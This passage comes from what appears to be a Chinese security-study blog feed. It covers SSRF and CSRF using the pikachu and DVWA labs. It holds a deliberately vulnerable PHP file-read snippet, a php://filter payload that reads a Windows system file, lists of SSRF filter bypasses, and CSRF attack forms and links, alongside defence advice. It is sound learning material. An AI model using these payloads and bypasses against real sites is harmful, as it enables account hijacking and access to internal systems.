&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//内网请求:http://x.x.x.x/xx.index&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;file&amp;#x27;]) &amp;amp;&amp;amp; $_GET[&amp;#x27;file&amp;#x27;] !=null)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filename = $_GET[&amp;#x27;file&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $str = file_get_contents($filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo $str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?file=php://filter/read=convert.base64-encode/resource=C:\Windows\system.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbMzg2RW5oXQ0Kd29hZm9udD1kb3NhcHAuZm9uDQpFR0E4MFdPQS5GT049RUdBODBXT0EuRk9ODQpFR0E0MFdPQS5GT049RUdBNDBXT0EuRk9ODQpDR0E4MFdPQS5GT049Q0dBODBXT0EuRk9ODQpDR0E0MFdPQS5GT049Q0dBNDBXT0EuRk9ODQoNCltkcml2ZXJzXQ0Kd2F2ZT1tbWRydi5kbGwNCnRpbWVyPXRpbWVyLmRydg0KDQpbbWNpXQ0K&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;pikachu-fsockopen-ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pikachu-fsockopen-ssrf&#34;&gt;#&lt;/a&gt; pikachu-fsockopen ssrf&lt;/h4&gt;
&lt;p&gt;加载远程网站&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?url=www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ssrf防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf防御&#34;&gt;#&lt;/a&gt; ssrf 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;过滤开头不是&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHAlM0ElMkYlMkZ4eHguY29t&#34;&gt; http://xxx.com&lt;/span&gt; 的所有链接，白名单限制 http/https 协议&lt;/li&gt;
&lt;li&gt;过滤格式为 ip 的链接，比如 127.0.0.1&lt;/li&gt;
&lt;li&gt;结尾必须是某个后缀&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;http://www.baidu.com@10.10.10.10&lt;/code&gt;  与 &lt;code&gt;http://10.10.10.10&lt;/code&gt;  请求是相同的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;172.16.60.166/curl.php?url=http://wwwbaidu.com@172.16.60.166/curl.php?url=http://www.google.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;绕过 IP 127.0.0.1 过滤&lt;/p&gt;
&lt;p&gt;1. 变形&lt;/p&gt;
&lt;p&gt;http://[::1]&lt;br&gt;
http://[::ffff:7f00:1]&lt;br&gt;
http://[::ffff:127.0.0.1]&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4x&#34;&gt;http://127.1&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjE=&#34;&gt;http://127.0.1&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzA6ODA=&#34;&gt;http://0:80&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2.ip 进制转换&lt;/p&gt;
&lt;p&gt;转为 16 进制，或 10 进制，8 进制&lt;/p&gt;
&lt;p&gt;3.16 进制网址编码&lt;/p&gt;
&lt;p&gt;4.30x 重定向&lt;/p&gt;
&lt;p&gt;防御&lt;/p&gt;
&lt;p&gt;・禁止 302 跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。&lt;/p&gt;
&lt;p&gt;CURLOPT_FOLLOWLOCATION&lt;/p&gt;
&lt;p&gt;・过滤返回信息，验证远程服务器对请求的返回结果，是否合法。&lt;/p&gt;
&lt;p&gt;・禁用高危协议，例如：gopher、dict、ftp、file 等，只允许 http/https&lt;/p&gt;
&lt;p&gt;・设置 URL 白名单或者限制内网 IP&lt;/p&gt;
&lt;p&gt;・限制请求的端口为 http 的常用端口，或者根据业务需要治开放远程调用服务的端口&lt;/p&gt;
&lt;p&gt;・catch 错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/27/CSRF/</guid>
            <title>CSRF</title>
            <link>http://example.com/2022/05/27/CSRF/</link>
            <pubDate>Fri, 27 May 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;引用自 pikachu 的解释：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CSRF (跨站请求伪造) 概述&lt;/p&gt;
&lt;p&gt;Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 &amp;quot;one click&amp;quot; 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。&lt;br&gt;
这里列举一个场景解释一下，希望能够帮助你理解。&lt;br&gt;
&lt;strong&gt;场景需求：&lt;/strong&gt;&lt;br&gt;
小黑想要修改大白在购物网站 tianxiewww.xx.com 上填写的会员地址。&lt;br&gt;
&lt;strong&gt;先看下大白是如何修改自己的密码的：&lt;/strong&gt;&lt;br&gt;
登录 — 修改会员信息，提交请求 — 修改成功。&lt;br&gt;
所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。&lt;/p&gt;
&lt;p&gt;但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？&lt;br&gt;
于是他自己跑到 www.xx.com 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：&lt;br&gt;
【&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tL2VkaXQucGhwP2VtYWlsPXhpYW9oZWlAODguY29tJmFtcDtDaGFuZ2U9Q2hhbmdlJUUzJTgwJTkx&#34;&gt;http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;amp;Change=Change】&lt;/span&gt;&lt;br&gt;
于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为啥小黑的操作能够实现呢。有如下几个关键点：&lt;/strong&gt;&lt;br&gt;
1.www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造；&lt;br&gt;
— 因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。&lt;br&gt;
2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上；&lt;br&gt;
— 如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。&lt;br&gt;
— 因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。&lt;br&gt;
当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。&lt;br&gt;
— 所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。&lt;/p&gt;
&lt;p&gt;因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：&lt;br&gt;
–对敏感信息的操作增加安全的 token；&lt;br&gt;
–对敏感信息的操作增加安全的验证码；&lt;br&gt;
–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作，没有对用户合法身份进行验证&lt;/p&gt;
&lt;p&gt;官方术语说：攻击能劫持终端用户在已登录的 Web 站点上执行本意操作，会自动携带同一域名下的 cookie 到服务器，简单的说攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF 的过程非常隐秘受害人甚至无法察觉。&lt;/p&gt;
&lt;p&gt;产生 CSRF 漏洞的原因大致有以下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一方面是开发者不够谨慎，编写的 Web 应用程序存在漏洞导致恶意利用；&lt;/li&gt;
&lt;li&gt;另一方面因为 Web 浏览器对于 Cookie 和 HTTP 身份验证的回话信息的处理存在一定的缺陷；&lt;/li&gt;
&lt;li&gt;服务器对于浏览器过于信任，相信从该浏览器发出的请求都是正确的，却没有区分这是用户主动发送的请求，还是模拟用户行为发出来的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221118090340493.png&#34; alt=&#34;image-20221118090340493&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;csrf类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf类型&#34;&gt;#&lt;/a&gt; CSRF 类型&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GET 类型的 CSRF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;amp;password_conf=aaaaaa&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在受害者访问这个页面后，浏览器会自动向 &lt;code&gt;http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;amp;password_conf=aaaaaa&amp;amp;Change=Change#&lt;/code&gt; 发出一次 HTTP 请求。1.1.1.1:18888 就会受到用户修改密码的跨域请求，同时因为用户在 A 页面没有登出，浏览器会携带 A 的 cookie&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST 类型的 CSRF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.example/withdraw&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;POST&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;account&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;xiaoming&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;10000&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;for&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hacker&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;forms&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].&lt;span class=&#34;title function_&#34;&gt;submit&lt;/span&gt;(); &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接类型的 CSRF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：&lt;/p&gt;
&lt;p&gt;&lt;code&gt; &amp;lt;a href=&amp;quot;http://test.com/csrf/withdraw.php?amount=1000&amp;amp;for=hacker&amp;quot; taget=&amp;quot;_blank&amp;quot;&amp;gt;   重磅消息！！   &amp;lt;a/&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;csrf漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf漏洞利用&#34;&gt;#&lt;/a&gt; CSRF 漏洞利用&lt;/h4&gt;
&lt;p&gt;描述：CSRF 的利用点找寻 &lt;code&gt;订单下单处 修改敏感信息处 删除信息处 绑定处 发送信息处&lt;/code&gt; ；CSRF 利用场景:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取个人数据（常常使用）&lt;/li&gt;
&lt;li&gt;修改个人数据（横向越权）&lt;/li&gt;
&lt;li&gt;添加用户（纵向越权）等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;电商用户新增默认收货地址、发微博、添加管理员等等，所有的敏感操作都可以是我们的攻击目标，发现的用户账号授权相关的操作、二维码登陆、绑定第三方账号等，这些功能有 CSRF 的话就直接被盗号了，也就是说所有的敏感操作都需要进行 CSRF 的防护。&lt;/p&gt;
&lt;h2 id=&#34;dvwa&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dvwa&#34;&gt;#&lt;/a&gt; dvwa&lt;/h2&gt;
&lt;p&gt;1.low&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png&#34; alt=&#34;image-20221029213100094&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于我当前已经登录，因此网站中是存在我的 cookie 滴&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213206492.png&#34; alt=&#34;image-20221029213206492&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且在 low 模式下，没有原密码做验证，也没有 token 对用户身份最校验，那么 csrf 就出现了&lt;/p&gt;
&lt;p&gt;我目前修改自己的密码，从 password 修改为 123456，观察 URL 的变化&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;网络中有个 hacker，抓到了我修改密码的请求包，意味着他也得到了上述 url，那么他就可以构造以下 url：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;amp;password_conf=aaaaaa&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后把它缩短为短链接的形式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://gg.gg/12iqj8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我一旦点击后，就会向服务器发送 change password 的请求&lt;/p&gt;
&lt;p&gt;此时我的密码就会被改变&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213847558.png&#34; alt=&#34;image-20221029213847558&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213921662.png&#34; alt=&#34;image-20221029213921662&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.medium&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if( isset( $_GET[ ‘Change’ ] ) ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // Checks to see where the request came from&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // Get input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $pass_new = $_GET[ ‘password_new’ ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $pass_conf = $_GET[ ‘password_conf’ ];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;多了判断 HTTP_REFERER 中是否有 SERVER_NAME，HTTP_REFERER 是 Referer 参数值，即来源地址，SERVER_NAME 是 host 参数及主机 ip 名&lt;/p&gt;
&lt;p&gt;其实他是想限制同源，但可以绕过&lt;/p&gt;
&lt;p&gt;同时使用 csrftester 生成 payload，但不一样的是需要修改文件名为 IP.html，比如 192.168.13.133.html，这样在检测 refer 时就会包括了我们的 hostIP，相当于&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HOST: 192.168.13.133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://101.1.1.1/dvwa/192.168.13.133.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3.high&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if ($change) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	// Check Anti-CSRF token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	checkToken( $token, $_SESSION[ &amp;#x27;session_token&amp;#x27; ], &amp;#x27;index.php&amp;#x27; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	// Do the passwords match?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if( $pass_new == $pass_conf ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// They do!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$pass_new = mysqli_real_escape_string ($GLOBALS[&amp;quot;___mysqli_ston&amp;quot;], $pass_new);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$pass_new = md5( $pass_new );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// Update the database&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$insert = &amp;quot;UPDATE `users` SET password = &amp;#x27;&amp;quot; . $pass_new . &amp;quot;&amp;#x27; WHERE user = &amp;#x27;&amp;quot; . dvwaCurrentUser() . &amp;quot;&amp;#x27;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$result = mysqli_query($GLOBALS[&amp;quot;___mysqli_ston&amp;quot;],  $insert );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// Feedback for the user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$return_message = &amp;quot;Password Changed.&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// Issue with passwords matching&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$return_message = &amp;quot;Passwords did not 